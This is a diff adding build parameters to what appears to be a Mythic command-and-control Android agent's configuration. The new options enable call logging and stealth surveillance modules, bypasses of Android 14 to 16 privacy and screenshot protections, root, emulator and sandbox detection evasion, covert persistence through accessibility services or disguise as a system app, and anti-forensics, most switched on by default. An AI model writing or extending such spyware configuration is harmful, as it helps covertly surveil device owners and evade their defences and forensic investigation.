@@ -96,6 +96,89 @@
       "type": "dropdown",
       "allowed_values": ["12", "13", "14", "15", "16"],
       "default_value": "14"
+    },
+    {
+      "name": "enable_device_fingerprinting",
+      "description": "Enable device fingerprinting for campaign isolation",
+      "type": "boolean",
+      "default_value": true
+    },
+    {
+      "name": "thread_pool_size",
+      "description": "Maximum concurrent module execution threads",
+      "type": "integer",
+      "default_value": 5,
+      "min": 1,
+      "max": 20
+    },
+    {
+      "name": "enable_module_dependency_injection",
+      "description": "Enable dependency injection for modules",
+      "type": "boolean",
+      "default_value": true
+    },
+    {
+      "name": "config_encryption_key",
+      "description": "Base64 encoded configuration encryption key",
+      "type": "string",
+      "default_value": "",
+      "required": false
+    },
+    {
+      "name": "android_14_privacy_bypass",
+      "description": "Enable Android 14 enhanced privacy bypasses",
+      "type": "boolean",
+      "default_value": true
+    },
+    {
+      "name": "android_15_partial_screenshot_protection_bypass",
+      "description": "Bypass Android 15 partial screenshot protection",
+      "type": "boolean",
+      "default_value": true
+    },
+    {
+      "name": "android_16_security_features_bypass",
+      "description": "Bypass Android 16 new security features",
+      "type": "boolean",
+      "default_value": true
+    },
+    {
+      "name": "module_load_order",
+      "description": "Comma-separated list defining module loading priority",
+      "type": "string",
+      "default_value": "call_logger,filesystem,stealth_surveillance,overlay,frida_loader"
+    },
+    {
+      "name": "enable_root_detection_bypass",
+      "description": "Enable root detection bypass mechanisms",
+      "type": "boolean",
+      "default_value": true
+    },
+    {
+      "name": "enable_emulator_detection_bypass",
+      "description": "Enable emulator detection bypass mechanisms",
+      "type": "boolean",
+      "default_value": true
+    },
+    {
+      "name": "sandbox_evasion_techniques",
+      "description": "Comma-separated list of sandbox evasion techniques",
+      "type": "string",
+      "default_value": "sleep_delay,api_call_validation,user_interaction_check"
+    },
+    {
+      "name": "stealth_persistence_method",
+      "description": "Method for maintaining stealth persistence",
+      "type": "dropdown",
+      "allowed_values": ["device_admin", "accessibility_service", "work_profile", "system_app_disguise"],
+      "default_value": "accessibility_service"
+    },
+    {
+      "name": "anti_forensics_level",
+      "description": "Level of anti-forensics measures",
+      "type": "dropdown",
+      "allowed_values": ["none", "basic", "advanced", "paranoid"],
+      "default_value": "advanced"
     }
   ],
   "docker_image": "mythic_android_agent:latest",
